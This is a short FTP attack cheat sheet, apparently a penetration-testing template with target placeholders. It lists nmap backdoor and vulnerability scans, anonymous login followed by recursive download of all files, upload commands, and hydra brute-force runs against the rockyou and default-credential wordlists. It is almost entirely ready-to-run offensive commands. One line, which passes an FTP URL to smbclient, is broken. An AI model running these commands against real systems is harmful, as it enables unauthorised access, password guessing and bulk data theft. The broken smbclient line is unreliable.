# === NMAP FTP SCRIPTS ===
nmap -sV --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 {{TARGET}}

# === ANONYMOUS LOGIN ===
ftp {{TARGET}}
ftp -p {{TARGET}}
# Login: anonymous / anonymous or anonymous / blank
# Once connected - get everything
binary
prompt OFF
recurse ON
mget *
# Skip interactive FTP entirely
wget -r --user=anonymous --password=anonymous ftp://{{TARGET}}/
wget -r --user=anonymous --password=anonymous --no-passive-ftp ftp://{{TARGET}}/

# === AUTHENTICATED ACCESS ===
ftp {{TARGET}}
wget -r ftp://{{USER}}:{{PASS}}@{{TARGET}}/
smbclient ftp://{{USER}}:{{PASS}}@{{TARGET}}

# === FILE OPERATIONS ===
# Upload (from ftp> prompt)
binary
put {{FILENAME}}
# Download recursive with credentials
wget -r ftp://{{USER}}:{{PASS}}@{{TARGET}}/

# === BRUTE FORCE ===
hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} -t 4 ftp
hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt {{TARGET}} ftp
